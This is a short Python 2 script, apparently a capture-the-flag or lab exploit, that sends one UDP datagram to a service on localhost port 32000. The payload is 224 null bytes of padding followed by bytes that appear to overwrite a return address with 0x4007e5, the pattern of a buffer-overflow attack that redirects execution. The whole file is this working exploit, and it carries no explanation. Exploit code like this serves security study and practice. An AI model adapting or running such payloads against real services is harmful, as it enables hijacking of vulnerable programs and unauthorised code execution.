import socket

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

server_address = ('localhost', 32000)

line = raw_input()
message = "\x00"*224 + "\x00\x00\x00\x00\x00\x40\x07\xe5"
sent = sock.sendto(message, server_address)

data, server = sock.recvfrom(1000)
print data